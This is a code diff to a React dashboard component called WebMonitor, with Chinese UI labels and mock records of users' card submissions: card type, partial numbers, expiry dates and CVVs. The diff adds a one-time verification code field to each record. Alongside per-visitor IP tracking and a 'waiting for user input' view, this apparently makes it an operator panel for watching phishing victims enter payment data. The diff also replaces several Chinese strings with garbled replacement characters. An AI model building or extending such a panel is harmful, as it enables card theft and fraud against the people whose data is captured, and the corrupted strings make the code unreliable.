@@ -96,9 +96,9 @@ const submissionData: UserSubmission[] = [
     },
     submitCount: 3,
     submitHistory: [
-      { timestamp: "11:28", cardType: "debit", partialCard1: "4321", partialCard2: "567", fullCard: "4321 **** **** 5678", expiryDate: "09/26", cvv: "123" },
-      { timestamp: "11:25", cardType: "credit", partialCard1: "5555", partialCard2: "444", fullCard: "5555 **** **** 4444", expiryDate: "08/25", cvv: "***" },
-      { timestamp: "11:22", cardType: "debit", partialCard1: "6226", partialCard2: "789", fullCard: "6226 **** **** 7890", expiryDate: "03/27", cvv: "***" }
+      { timestamp: "11:28", cardType: "debit", partialCard1: "4321", partialCard2: "567", fullCard: "4321 **** **** 5678", expiryDate: "09/26", cvv: "123", verificationCode: "8765" },
+      { timestamp: "11:25", cardType: "credit", partialCard1: "5555", partialCard2: "444", fullCard: "5555 **** **** 4444", expiryDate: "08/25", cvv: "***", verificationCode: "2341" },
+      { timestamp: "11:22", cardType: "debit", partialCard1: "6226", partialCard2: "789", fullCard: "6226 **** **** 7890", expiryDate: "03/27", cvv: "***", verificationCode: "9876" }
     ],
     enterTime: "11:20:15",
     updateTime: "11:30:42",
@@ -212,7 +212,7 @@ const submissionData: UserSubmission[] = [
     dataSize: "128Kb",
     fieldsCount: 4,
     ipAddress: "192.168.1.200"
-    // 完全没有用户数据，用户刚进入页面
+    // ���全没有用户数据，用户刚进入页面
   }
 ];
 
@@ -303,7 +303,7 @@ export function WebMonitor() {
           
           <div className="flex items-center gap-2">
             <Button variant="ghost" size="sm" className="text-muted-foreground hover:text-foreground">
-              ��� ���点管��
+              ��� ���点管理
             </Button>
             <Button variant="ghost" size="sm" className="text-muted-foreground hover:text-foreground">
               📊 实时统计
@@ -616,7 +616,7 @@ export function WebMonitor() {
                 ) : (
                   <div className="flex items-center justify-center py-4 mb-0.5">
                     <div className="text-sm text-muted-foreground italic">
-                      等待用户输入数据...
+                      ���待用户输入数据...
                     </div>
                   </div>
                 );
@@ -647,7 +647,7 @@ export function WebMonitor() {
                   <h4 className="text-sm font-medium text-foreground mb-1">详细信息</h4>
                   <div className="grid grid-cols-4 gap-3 text-xs">
                     <div>
-                      <span className="text-muted-foreground">提交时间: </span>
+                      <span className="text-muted-foreground">提交时��: </span>
                       <span className="font-medium">{submission.timestamp}</span>
                     </div>
                     <div>
